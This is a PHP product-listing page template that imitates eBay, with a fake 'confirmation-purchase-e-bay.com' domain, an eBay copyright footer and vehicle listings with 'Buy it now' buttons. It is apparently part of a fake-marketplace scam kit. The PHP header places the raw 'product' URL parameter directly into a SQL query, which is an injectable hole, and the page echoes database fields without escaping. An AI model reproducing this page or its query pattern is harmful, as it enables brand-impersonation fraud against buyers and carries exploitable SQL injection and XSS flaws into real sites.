<?php
include "../admin/lib/database.php";
include "../lib/siteinforesults.php";
?>
<!-- Product results php code start -->
    <?php
        if ($_GET['product']) {
        $Rproduct = $_GET['product'];
        $product = str_replace("-", " ", $Rproduct);

    // products table data fetch code.
      $match_query = "SELECT * FROM products WHERE p_name='$product'";
      $match_results = mysqli_query($conn, $match_query);

      if (mysqli_num_rows($match_results) > 0){
        while($inventories_results = mysqli_fetch_assoc($match_results)){
          $p_name = $inventories_results["p_name"];
          $p_price = $inventories_results["p_price"];
          $description = $inventories_results["description"];
          $short_description = $inventories_results["short_description"];
          $p_condition = $inventories_results["p_condition"];
          $location = $inventories_results["location"];
          $shipping_mode = $inventories_results["shipping_mode"];
          $engine_name = $inventories_results["engine_name"];
          $engine_hp = $inventories_results["engine_hp"];
          $transmission = $inventories_results["transmission"];
          $f_image = $inventories_results["f_image"];
          $gallery_image = $inventories_results["gallery_image"];
    }
  }
}
?>
<!-- Product results php code end -->


<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title><?php echo $p_name;?> | Ebay Market</title>
<link rel="icon" href="../admin/uploads/<?php echo $site_favicon;?>">
<meta property="og:site_name" content="<?php echo $site_title;?>">
<meta property="og:title" content="<?php echo $p_name;?>">
<meta property="og:description" content="<?php echo $p_name;?>: <?php echo $p_price;?>">
<meta property="og:image" content="../admin/uploads/featured/<?php echo $f_image;?>">
<meta property="og:image" content="<?php echo $site_logo;?>">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link id="wsite-base-style" rel="stylesheet" type="text/css" href="./css/sites.css">
<link rel="stylesheet" type="text/css" href="./css/fancybox.css">
<link rel="stylesheet" type="text/css" href="./css/social-icons.css" media="screen,projection">
<link rel="stylesheet" type="text/css" href="./css/main_style.css" title="wsite-theme-css">
<link href="./css/font.css" rel="stylesheet" type="text/css">
<link href="./css/font(1).css" rel="stylesheet" type="text/css">
<link href="./css/font(2).css" rel="stylesheet" type="text/css">
<link href="./css/font(3).css" rel="stylesheet" type="text/css">

<style type="text/css">
.wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {}
#wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {}
.wsite-elements.wsite-footer div.paragraph, .wsite-elements.wsite-footer p, .wsite-elements.wsite-footer .product-block .product-title, .wsite-elements.wsite-footer .product-description, .wsite-elements.wsite-footer .wsite-form-field label, .wsite-elements.wsite-footer .wsite-form-field label{}
.wsite-elements.wsite-not-footer:not(.wsite-header-elements) h2, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-long .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-large .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-small .product-title, #wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {font-weight:400 !important;}
#wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {}
.wsite-elements.wsite-footer h2, .wsite-elements.wsite-footer .product-long .product-title, .wsite-elements.wsite-footer .product-large .product-title, .wsite-elements.wsite-footer .product-small .product-title{}
#wsite-title {}
.wsite-menu-default a {}
.wsite-menu a {}
.wsite-image div, .wsite-caption {}
.galleryCaptionInnerText {}
.fancybox-title {}
.wslide-caption-text {}
.wsite-phone {}
.wsite-headline,.wsite-header-section .wsite-content-title {}
.wsite-headline-paragraph,.wsite-header-section .paragraph {}
.wsite-button-inner {text-transform:  uppercase !important;}
.wsite-not-footer blockquote {}
.wsite-footer blockquote {}
.blog-header h2 a {}
#wsite-content h2.wsite-product-title {}
.wsite-product .wsite-product-price a {}
@media screen and (min-width: 767px) {.wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {}
#wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {}
.wsite-elements.wsite-footer div.paragraph, .wsite-elements.wsite-footer p, .wsite-elements.wsite-footer .product-block .product-title, .wsite-elements.wsite-footer .product-description, .wsite-elements.wsite-footer .wsite-form-field label, .wsite-elements.wsite-footer .wsite-form-field label{}
.wsite-elements.wsite-not-footer:not(.wsite-header-elements) h2, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-long .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-large .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-small .product-title, #wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {}
#wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {}
.wsite-elements.wsite-footer h2, .wsite-elements.wsite-footer .product-long .product-title, .wsite-elements.wsite-footer .product-large .product-title, .wsite-elements.wsite-footer .product-small .product-title{}
#wsite-title {}
.wsite-menu-default a {}
.wsite-menu a {}
.wsite-image div, .wsite-caption {}
.galleryCaptionInnerText {}
.fancybox-title {}
.wslide-caption-text {}
.wsite-phone {}
.wsite-headline,.wsite-header-section .wsite-content-title {}
.wsite-headline-paragraph,.wsite-header-section .paragraph {}
.wsite-button-inner {}
.wsite-not-footer blockquote {}
.wsite-footer blockquote {}
.blog-header h2 a {}
#wsite-content h2.wsite-product-title {}
.wsite-product .wsite-product-price a {}
}</style>
<link rel="stylesheet" type="text/css" href="./css/slideshow.css">

	<script src="./js/templateArtifacts.js"></script>
<script async="" src="./js/snowday262.js"></script><script type="text/javascript" async="" src="./js/ga.js"></script><script>
var STATIC_BASE = '//cdn1.editmysite.com/';
var ASSETS_BASE = '//cdn2.editmysite.com/';
var STYLE_PREFIX = 'wsite';
</script>
<script src="./js/jquery-1.8.3.min.js"></script>

<script type="text/javascript" src="./js/stl.js"></script>
<script src="./js/main.js"></script><script type="text/javascript">
	function initCustomerAccountsModels() {
				(function(){_W.setup_rpc({"url":"\/ajax\/api\/JsonRPC\/CustomerAccounts\/","actions":{"CustomerAccounts":[{"name":"login","len":2,"multiple":false,"standalone":false},{"name":"logout","len":0,"multiple":false,"standalone":false},{"name":"getSessionDetails","len":0,"multiple":false,"standalone":false},{"name":"getAccountDetails","len":0,"multiple":false,"standalone":false},{"name":"getOrders","len":0,"multiple":false,"standalone":false},{"name":"register","len":4,"multiple":false,"standalone":false},{"name":"emailExists","len":1,"multiple":false,"standalone":false},{"name":"passwordReset","len":1,"multiple":false,"standalone":false},{"name":"passwordUpdate","len":3,"multiple":false,"standalone":false},{"name":"validateSession","len":1,"multiple":false,"standalone":false}]},"namespace":"_W.CustomerAccounts.RPC"});
_W.setup_model_rpc({"rpc_namespace":"_W.CustomerAccounts.RPC","model_namespace":"_W.CustomerAccounts.BackboneModelData","collection_namespace":"_W.CustomerAccounts.BackboneCollectionData","bootstrap_namespace":"_W.CustomerAccounts.BackboneBootstrap","models":{"CustomerAccounts":{"_class":"CustomerAccounts.Model.CustomerAccounts","defaults":null,"validation":null,"types":null,"idAttribute":null,"keydefs":null}},"collections":{"CustomerAccounts":{"_class":"CustomerAccounts.Collection.CustomerAccounts"}},"bootstrap":[]});
})();
	}
	if(document.createEvent && document.addEventListener) {
		var initEvt = document.createEvent('Event');
		initEvt.initEvent('customerAccountsModelsInitialized', true, false);
		document.dispatchEvent(initEvt);
	} else if(document.documentElement.initCustomerAccountsModels === 0){
		document.documentElement.initCustomerAccountsModels++
	}
	</script>
	<script type="text/javascript"> _W = _W || {}; _W.securePrefix='www.confirmation-purchase-e-bay.com'; </script><script>_W = _W || {};
		_W.customerLocale = "en_US";
		_W.storeName = null;
		_W.isCheckoutReskin = false;
		_W.storeCountry = "US";
		_W.storeCurrency = "USD";
		_W.storeEuPrivacyPolicyUrl = "";
		com_currentSite = "182179783602333688";
		com_userID = "144590663";</script><script type="text/javascript" src="./js/slideshow-jq.js"></script>
<script type="text/javascript">_W.configDomain = "www.weebly.com";</script><script>_W.relinquish && _W.relinquish()</script>
<script type="text/javascript" src="./js/stl.js"></script><script> _W.themePlugins = [];</script><script type="text/javascript"> _W.recaptchaUrl = "https://www.google.com/recaptcha/api.js"; </script>
	
	
<style type="text/css">.customer-accounts-app__body[data-v-07eff8e1]{width:100%}.customer-accounts-app__modal-wrapper[data-v-07eff8e1]{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:17;display:flex;flex-direction:column;justify-content:center;align-items:center;background:rgba(0,0,0,.25)}.customer-accounts-app__modal[data-v-07eff8e1]{width:580px;box-sizing:border-box;max-height:100%;min-height:415px;overflow-y:auto;z-index:18;padding:24px;background:#fff;display:flex}.wsite-theme-dark .customer-accounts-app__modal-wrapper[data-v-07eff8e1]{background:hsla(0,0%,100%,.25)}.wsite-theme-dark .customer-accounts-app__modal[data-v-07eff8e1]{background:#000}@media (max-width:750px){.customer-accounts-app__modal[data-v-07eff8e1]{width:100%;height:100%}}</style><style type="text/css">.loading[data-v-3519d388]{display:flex;width:100%;align-items:center;justify-content:center;margin:15px 0}</style><style type="text/css">.page-header__wrapper[data-v-81ca95b4]{display:flex;flex-direction:row;align-items:center;justify-content:space-between}.page-header__text[data-v-81ca95b4]{margin:0 32px 0 0}.page-header__divider[data-v-81ca95b4]{height:1px;width:100%;margin:24px 0;background:rgba(0,0,0,.1)}</style><style type="text/css">.form-field[data-v-29b796a4]{margin:16px 0}.form-field__label[data-v-29b796a4]{display:flex;flex-direction:column}.form-field__title[data-v-29b796a4]{margin-bottom:8px;font-size:90%;color:#3b526d}.wsite-theme-dark .form-field__title[data-v-29b796a4]{color:#dfe6ee}.form-field__error[data-v-29b796a4]{margin-top:14px}</style><style type="text/css">.field-error[data-v-1c00ebfa]{color:#ff2825}</style><style type="text/css">.form-instructions[data-v-57a288ec]{margin-bottom:24px}</style><style type="text/css">.site-input[data-v-cbc6ea64]{border:1px solid #dbdbdb;padding:8px;border-radius:2px}.site-input__is-invalid[data-v-cbc6ea64]{border:1px solid #ff2825}</style><style type="text/css">.actions-row[data-v-4932eaa4]{margin-top:24px;display:flex;flex-direction:row;justify-content:space-between;align-items:center}.actions-row div[data-v-4932eaa4]:first-child{margin-right:16px}</style><style type="text/css">.back-button[data-v-9298a980]{display:flex;flex-direction:row;align-items:center}.back-button__icon[data-v-9298a980]{margin:0 8px 0 0}</style><style type="text/css">p[data-v-0770d94c]{font-weight:700}.order-confirmation__checkbox[data-v-0770d94c]{margin-right:6px}.order-confirmation__success-message[data-v-0770d94c]{display:flex;flex-direction:row;align-items:center}</style><style type="text/css">.register__privacy-policy[data-v-4f309485]{margin:24px 0;font-size:small}</style><style type="text/css">.customer-accounts-app__body[data-v-2752a12c]{width:100%}.customer-accounts-app__modal-wrapper[data-v-2752a12c]{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:17;display:flex;flex-direction:column;justify-content:center;align-items:center;background:rgba(0,0,0,.25)}.customer-accounts-app__modal[data-v-2752a12c]{width:580px;box-sizing:border-box;max-height:100%;min-height:415px;overflow-y:auto;z-index:18;padding:24px;background:#fff;display:flex}.wsite-theme-dark .customer-accounts-app__modal-wrapper[data-v-2752a12c]{background:hsla(0,0%,100%,.25)}.wsite-theme-dark .customer-accounts-app__modal[data-v-2752a12c]{background:#000}@media (max-width:600px){.customer-accounts-app__modal[data-v-2752a12c]{width:100%;height:100%}}</style><style type="text/css">.account-details__wrapper[data-v-29f64e05]{width:100%}.account-details__group[data-v-29f64e05]{margin-bottom:24px;text-align:left}.account-details__table-container[data-v-29f64e05]{overflow:auto}.account-details__title[data-v-29f64e05]{text-align:left;margin-bottom:6px}.account-details__log-out[data-v-29f64e05]{cursor:pointer}.account-details__error[data-v-29f64e05]{margin:36px 0;text-align:left}.error[data-v-29f64e05]{color:#ff2825}</style><style type="text/css">.section-header__wrapper[data-v-6d7d03a4]{display:flex;flex-direction:row;align-items:center;justify-content:space-between}.section-header__text[data-v-6d7d03a4]{margin:24px 0}</style><style type="text/css">.empty-content-area__container[data-v-498ccaa4]{display:flex;flex-direction:row;align-items:center;justify-content:center;margin-bottom:32px;width:100%;min-height:80px;background:#f2f2f2}.wsite-theme-dark .empty-content-area__container[data-v-498ccaa4]{background:#000}</style><style type="text/css">.order-details__table[data-v-3e08a283]{width:100%;margin-top:12px;margin-bottom:36px;empty-cells:show;border-collapse:collapse;border-spacing:0;border:none}.order-details__table th[data-v-3e08a283]{margin:0;padding:16px;text-align:left;background:#f2f2f2}.wsite-theme-dark .order-details__table th[data-v-3e08a283]{background:#000}.order-details__table td[data-v-3e08a283]{margin:0;padding:16px;text-align:left}</style><style type="text/css">.shipping-address__wrapper[data-v-7d842472]{text-align:left;width:100%}</style><style type="text/css">.reset-password__link[data-v-1b4ea0c2]{cursor:pointer}</style></head>
<body class="no-header-page  wsite-page-2986608499  collapsed-menu-off banner-bg-off  wsite-theme-light fade-in-nav"><div class="site-overlay"></div>
<div class="wrapper">
<div class="paris-header fixed">
  <div class="container">
	<div class="nav dummy-nav wsite-menu-default"><ul class="site-menu">
</ul>
</div>
	<div class="nav desktop-nav wsite-menu-default"><ul class="site-menu">
</ul>
</div>
	<label class="hamburger">
	  <span class="hamburger-icon">
		<div class="hamburger-line"></div>
		<div class="hamburger-line"></div>
		<div class="hamburger-line"></div>
	  </span>
	  <span class="menu-text menu-open-text">menu</span>
	  <span class="menu-text menu-close-text">close</span>
	</label>

<div class="logo">
	<span class="wsite-logo">
		<a href="#">
			<img src="../admin/uploads/<?php echo $site_logo?>" alt="Site Logo">
		</a>
	</span>
</div>
	<div class="site-utils">

	  

	  <button class="search-icon">
		<svg width="12px" height="13px" viewBox="0 0 12 13">
		  <path d="M7.77381641,9.19956292 L10.9920719,12.4178184 L12.414847,10.9950432 L9.20980439,7.79000058 C9.74708537,6.99373155 10.0605396,6.03546259 10.0605396,5.00435957 C10.0605396,2.2405281 7.80841112,1.77635684e-15 5.03026981,1.77635684e-15 C2.25212851,1.77635684e-15 0,2.2405281 0,5.00435957 C0,7.76819105 2.25212851,10.0087191 5.03026981,10.0087191 C6.0424316,10.0087191 6.98477215,9.71131871 7.77381641,9.19956292 Z M5.03026981,8.00697532 C6.6971546,8.00697532 8.0484317,6.66265846 8.0484317,5.00435957 C8.0484317,3.34606069 6.6971546,2.00174383 5.03026981,2.00174383 C3.36338503,2.00174383 2.01210793,3.34606069 2.01210793,5.00435957 C2.01210793,6.66265846 3.36338503,8.00697532 5.03026981,8.00697532 Z" id="search" stroke="none" fill-rule="evenodd"></path>
		</svg>
	  </button>
	  <button class="search-close">
		<span class="search-close-text">close</span>
		<span class="search-close-icon">
		  <svg width="14px" height="11px" viewBox="51 4 14 11">
			  <path d="M58,8.57142857 L61.5714286,5 L63,6.42857143 L59.4285714,10 L63,13.5714286 L61.5714286,15 L58,11.4285714 L54.4285714,15 L53,13.5714286 L56.5714286,10 L53,6.42857143 L54.4285714,5 L58,8.57142857 Z" id="close" stroke="none" fill-rule="evenodd"></path>
		  </svg>
		</span>
	  </button>

	  <div class="mini-cart-toggle">
		
	  </div>
	</div>
  </div><!-- end .container -->
  <div class="mini-cart-overlay">
	<button class="mini-cart-close">
	  <span class="mini-cart-close-text">close</span>
	  <span class="mini-cart-close-icon">
		<svg width="14px" height="11px" viewBox="51 4 14 11">
			<path d="M58,8.57142857 L61.5714286,5 L63,6.42857143 L59.4285714,10 L63,13.5714286 L61.5714286,15 L58,11.4285714 L54.4285714,15 L53,13.5714286 L56.5714286,10 L53,6.42857143 L54.4285714,5 L58,8.57142857 Z" id="close" stroke="none" fill="#000000" fill-rule="evenodd"></path>
		</svg>
	  </span>
	</button>
  </div>
  <div class="nav collapsed-nav wsite-menu-default"><ul class="site-menu">
</ul>
</div>
</div><!-- end .header -->

<div class="main-wrap">
  <div id="wsite-content" class="wsite-elements wsite-not-footer">
<div class="wsite-section-wrap">
<div class="wsite-section wsite-body-section wsite-background-16" style="height: 727px;">
	<div class="wsite-section-content">
	<div class="container">
		<div class="wsite-section-elements">
			<div class="paragraph"><font color="#2a2a2a"><strong><?php echo $p_name;?></strong></font><br><strong style="color:rgb(136, 136, 136)"><font color="#2a2a2a">Price $<?php echo $p_price;?></font></strong><br></div>

<div><div style="height:20px;overflow:hidden"></div>

<!-- ================= javascript slideshow will show below here ============= -->
<div id="242756003700933548-slideshow" class="wslide">

</div>
<!-- ================= javascript slideshow will show upon here ============-->

<!-- ============= SLIDER JS CODE START ============ -->
<script type="text/javascript">
(function(jQuery) {
function init() { window.wSlideshow && window.wSlideshow.render({elementID:"242756003700933548",nav:"thumbnails",navLocation:"bottom",captionLocation:"bottom",transition:"fade",autoplay:"1",speed:"5",aspectRatio:"auto",showControls:"true",randomStart:"false",images:[

	<?php
        $aGallery_images = explode(" , ", $gallery_image);
        foreach ($aGallery_images as $aGallery_image) {
	?>
		{"url":"../admin/uploads/product\/<?php echo $aGallery_image;?>","width":800,"height":530,"fullHeight":728,"fullWidth":1100},
	<?php
       }
    ?>

	]}) }
jQuery(document).ready(init);
})(window.jQuery)
</script>
<!-- ============= SLIDER JS CODE END ============ -->


<div style="height:20px;overflow:hidden"></div></div>

<div class="paragraph"><strong><font color="#2a2a2a">Location: <?php echo $location;?><br>Price: $<?php echo $p_price;?><br><?php echo $shipping_mode;?></font></strong><br></div>

<div style="text-align:center;"><div style="height: 10px; overflow: hidden;"></div>
<a class="wsite-button wsite-button-small wsite-button-normal" href="../terms-and-conditions">
<span class="wsite-button-inner">Buy it now</span>
</a>
<div style="height: 10px; overflow: hidden;"></div></div>

<div class="paragraph" style="text-align:center;">
	<font style="font-weight:400" color="#2a2a2a"><?php echo $p_name;?><br><?php echo $p_condition;?>, <?php echo $engine_hp;?><br>Engine: <?php echo $engine_name;?><br>Transmission: <?php echo $transmission;?><br>Firm price: $<?php echo $p_price;?><br><?php echo $short_description;?></font><br><font style="font-weight:400" color="#2a2a2a"><strong>Location:&nbsp;</strong></font><strong style="color:rgb(136, 136, 136)">📍&nbsp;&nbsp;<font color="#2a2a2a"><?php echo $location;?><br><?php echo $shipping_mode;?></font></strong><br>
</div>

<div style="text-align:center;"><div style="height: 10px; overflow: hidden;"></div>
<a class="wsite-button wsite-button-small wsite-button-normal" href="../terms-and-conditions">
<span class="wsite-button-inner">Buy it now</span>
</a>
<div style="height: 10px; overflow: hidden;"></div></div>

<div class="wsite-spacer" style="height:307px;"></div>
		</div>
	</div>
  </div>

</div>
</div>

</div>

</div>

<div class="footer-wrap">
  <div class="container">
	<div class="footer"><div class="wsite-elements wsite-footer">
<div class="paragraph" style="text-align:center;">© 1995-2023 eBay Inc. or its affiliates<br><br><span></span></div></div></div>
  </div><!-- end container -->
</div><!-- end footer-wrap -->
</div>

<script type="text/javascript" src="./js/plugins.js"></script>
<script type="text/javascript" src="./js/jquery.pxuMenu.js"></script>
<script type="text/javascript" src="./js/jquery.trend.js"></script>
<script type="text/javascript" src="./js/jquery.revealer.js"></script>
<script type="text/javascript" src="./js/debounce.js"></script>
<script type="text/javascript" src="./js/custom.js"></script>
<div id="customer-accounts-app"></div>
<script src="./js/main-customer-accounts-site.js"></script>

	<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-7870337-1']);
_gaq.push(['_setDomainName', 'none']);
_gaq.push(['_setAllowLinker', true]);

(function() {
	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
	// NOTE: keep the [1] if you replace this code. Otherwise cookie banner scripts won't be first on the page
	var s = document.getElementsByTagName('script')[1]; s.parentNode.insertBefore(ga, s);
})();

_W.Analytics = _W.Analytics || {'trackers': {}};
_W.Analytics.trackers.wGA = '_gaq';
</script>

<script type="text/javascript" async="1">
// NOTE: keep the getElementsByTagName(o)**[1]** if you replace this code. Otherwise cookie banner scripts won't be first on the page
;(function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];
		p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)
		};p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[1];n.async=1;
		n.src=w;g.parentNode.insertBefore(n,g)}}(window,document,'script','//cdn2.editmysite.com/js/wsnbn/snowday262.js','snowday'));

var r = [99, 104, 101, 99, 107, 111, 117, 116, 46, 40, 119, 101, 101, 98, 108, 121, 124, 101, 100, 105, 116, 109, 121, 115, 105, 116, 101, 41, 46, 99, 111, 109];
var snPlObR = function(arr) {
	var s = '';
	for (var i = 0 ; i < arr.length ; i++){
		s = s + String.fromCharCode(arr[i]);
	}
	return s;
};
var s = snPlObR(r);

var regEx = new RegExp(s);

_W.Analytics = _W.Analytics || {'trackers': {}};
_W.Analytics.trackers.wSP = 'snowday';
_W.Analytics.user_id = '144590663';
_W.Analytics.site_id = '182179783602333688';

var drSegmentsTag = document.getElementById('drSegments');
if (drSegmentsTag) {
	_W.Analytics.spContexts = _W.Analytics.spContexts || [];

	var segmentData = JSON.parse(drSegmentsTag.innerText);
	segmentData.forEach(function(test) {
		_W.Analytics.spContexts.push({
			schema: "iglu:com.weebly/context_ab_segment/jsonschema/1-0-0",
			data: {
				test_id: test.name,
				segment: test.variant,
			}
		});
	});
}


(function(app_id, ec_hostname, discover_root_domain) {
	var track = window[_W.Analytics.trackers.wSP];
	if (!track) return;
	track('newTracker', app_id, ec_hostname, {
		appId: app_id,
		post: true,
		platform: 'web',
		discoverRootDomain: discover_root_domain,
		cookieName: '_snow_',
		contexts: {
			webPage: true,
			performanceTiming: true,
			gaCookies: true
		},
		crossDomainLinker: function (linkElement) {
			return regEx.test(linkElement.href);
		},
		respectDoNotTrack: true
	});
	track('trackPageView', _W.Analytics.user_id+':'+_W.Analytics.site_id, _W.Analytics.spContexts);
	track('crossDomainLinker', function (linkElement) {
		return regEx.test(linkElement.href);
	});
})(
	'_wn',
	'ec.editmysite.com',
	true
);
</script>





<script>
(function(jQuery) {
	try {
		if (jQuery) {
			jQuery('div.blog-social div.fb-like').attr('class', 'blog-social-item blog-fb-like');
			var $commentFrame = jQuery('#commentArea iframe');
			if ($commentFrame.length > 0) {
				var frameHeight = jQuery($commentFrame[0].contentWindow.document).height() + 50;
				$commentFrame.css('min-height', frameHeight + 'px');
			}
			if (jQuery('.product-button').length > 0){
				jQuery(document).ready(function(){
					jQuery('.product-button').parent().each(function(index, product){
						if(jQuery(product).attr('target') == 'paypal'){
							if (!jQuery(product).find('> [name="bn"]').length){
								jQuery('<input>').attr({
									type: 'hidden',
									name: 'bn',
									value: 'DragAndDropBuil_SP_EC'
								}).appendTo(product);
							}
						}
					});
				});
			}
		}
		else {
			// Prototype
			$$('div.blog-social div.fb-like').each(function(div) {
				div.className = 'blog-social-item blog-fb-like';
			});
			$$('#commentArea iframe').each(function(iframe) {
				iframe.style.minHeight = '410px';
			});
		}
	}
	catch(ex) {}
})(window._W && _W.jQuery);
</script>

<script>
window._W.isEUUser = false;
window._W.showCookieToAll = "";
</script>




</body></html>